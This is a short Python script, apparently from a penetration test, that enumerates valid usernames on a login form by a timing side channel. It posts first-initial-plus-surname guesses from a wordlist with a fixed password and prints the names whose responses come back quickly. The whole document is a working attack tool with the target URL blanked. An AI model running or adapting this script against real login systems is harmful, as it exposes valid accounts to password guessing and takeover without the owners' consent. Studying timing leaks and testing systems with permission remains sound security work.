#
# This script was used to enumerate users on a client system
# Using time-based probing I was able to generate a list of
# valid username.
#
import requests
from string import ascii_lowercase
with open('1000-last-names.txt') as f:
    names = f.readlines()
names = [x.strip() for x in names]


url = ""

for c in ascii_lowercase:
    for name in names:
        r = requests.post(url, {'un': c + name, 'pw': 'password123'})
        if r.elapsed.total_seconds() < 1.5:
            print c + name


